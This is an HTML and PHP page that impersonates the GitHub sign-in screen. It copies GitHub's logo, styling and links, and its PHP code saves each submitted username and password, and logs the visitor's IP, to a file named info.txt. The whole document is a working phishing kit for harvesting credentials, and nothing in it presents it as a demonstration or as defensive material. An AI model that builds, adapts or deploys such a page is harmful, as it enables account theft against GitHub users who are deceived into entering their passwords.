<form method="post">
<div class="body">
        <div class="all-container col-12">
            <!-- logo -->
            <div class="logo-container">
                <img src="https://www.uplooder.net/img/image/91/aa85c0841f14ee083ed03bfc1c81284d/github-logo.png" alt="github-logo" class="logo">
            </div>
            <!-- text -->
            <span class="text-white fs-4 fw-lighter login-text">Sign in to GitHub</span>

            <!-- sign in -->
            <div class="signin-container rounded">
                <div class="form-container">
                    <div class="mb-3">
                        <label for="inputUsername" class="mb-2 form-label text-white inputTitle">Username or email address</label>
                        <input type="text" class="form-control input" name="name"id="inputUsername">
                    </div>
                    <div class="mb-0">
                        <div class="d-flex justify-content-between">
                            <label for="inputPassword" class="mb-2 form-label text-white inputTitle">Password</label>
                            <a href="#" class="forget-password">Forgot password?</a>
                        </div>
                        <input type="password" name="name2" class="form-control input" id="inputPassword">
                    </div>
                </div>
                <button type="sumbit" class="btn btn-success signin-btn">sign in</button>
            </div>
            <!-- create account -->
            <div class="new-container">
                <span><span  class="new-text">New to GitHub? </span><a href="#" style="font-size: .9rem;">Create an account</a>.</span>
            </div>
            <!-- links -->
            <div class="links-container">
                <a href="#">Terms</a>
                <a href="#">Privacy</a>
                <a href="#">Security</a>
                <a href="#" class="text-muted">Contact GitHub</a>
            </div>
        </div>
    </div>

<!-- bootstrap & popper & jQuery -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
<html> 

<body>

<style>
* {
    padding: 0;
    margin: 0;
}

.body {
    min-height: 100vh;
    background: #0d1117;
    display: flex;
    justify-content: center;
    overflow-x: hidden;
}

.all-container {
    padding-top: 30px;
    box-sizing: border-box;
    display: flex;
    align-items: center;
    flex-direction: column;
}

.logo-container {
    width: 50px;
    .logo {
        width: 100%;
        opacity: .8;
    }
}

.login-text {
    opacity: .8;
    margin-top: 30px;
}

.signin-container {
    width: 265px;
    background: #161b22;
    box-sizing: content-box;
    border: 1px solid #25262d;
    padding: 20px;
    margin-top: 15px;
}

.input {
    background: #0d1117 !important;
    border: 0 !important;
    color: #fff !important;
    height: 32px !important;
    font-weight: lighter !important;
    font-size: .9rem !important;
}

.input:focus {
    background: #0d1117 !important;
}

.inputTitle {
    font-size: .9rem;
    opacity: .9;
    font-weight: lighter;
}

.forget-password {
    font-size: .75rem;
}

a {
    text-decoration: none;
    color: rgb(88, 166, 255);
}

.signin-btn {
    width: 100%;
    height: 32px;
    margin-top: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #238636;
    border: 0;
    color: #fff;
    font-weight: 600;
    font-size: 1rem;
    transition: background .2s, opacity .3s;
    &:hover {
        background: #2ea043 !important;
    }
    &:active {
        opacity: .5 !important;
    }
    &:focus {
        background: #238636 !important;
    }
}

.new-container {
    width: 270px;
    padding: 15px;
    box-sizing: content-box;
    border: 1px solid rgba(255, 255, 255, .5);
    margin-top: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: 5px;
}

.new-text {
    color: #fff;
    font-size: .9rem;
    font-weight: lighter;
    opacity: .8;
}

.links-container {
    width: 250px;
    display: flex;
    justify-content: space-around;
    font-size: .8rem;
    margin-top: 4rem;
}

.alert-container {
    width: 300px;
    padding: 15px;
    color: #ff7b72;
    background-image: linear-gradient(rgba(248, 81, 73, 0.1));
    border: 1px solid rgba(248, 81, 73, 0.4);
    display: flex;
    justify-content: space-around;
    align-items: center;
    margin: 10px;
    font-size: .8rem;
    border-radius: 5px;
    .alert-close {
        width: 1rem;
        &:hover {
            opacity: .8;
            cursor: pointer;
        }
    }
    display: none;
}
</style>
</body>
</html> 


<?php  
function getUserIP() {
  if( array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER) && !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ) {
      if (strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ',')>0) {
          $addr = explode(",",$_SERVER['HTTP_X_FORWARDED_FOR']);
          return trim($addr[0]);
      } else {
          return $_SERVER['HTTP_X_FORWARDED_FOR'];
      }
  }
  else {
      return $_SERVER['REMOTE_ADDR'];
  }
}


$user_ip = getUserIP();


if (isset($_POST['name'])){
$ip = $user_ip;
$userinput = $_POST['name'];
$userinputt = $_POST['name2'];
$acapo = "\r\n";
$perip = ("Ip: $ip");
$perpassword = ("Password: $userinputt");
$perusername = ("Username: $userinput");
$myfile = fopen("info.txt", "w") or die("Unable to open file!");
fwrite($myfile, $perusername);
fwrite($myfile, $acapo);
fwrite($myfile, $perpassword);
fclose($myfile);}
?>

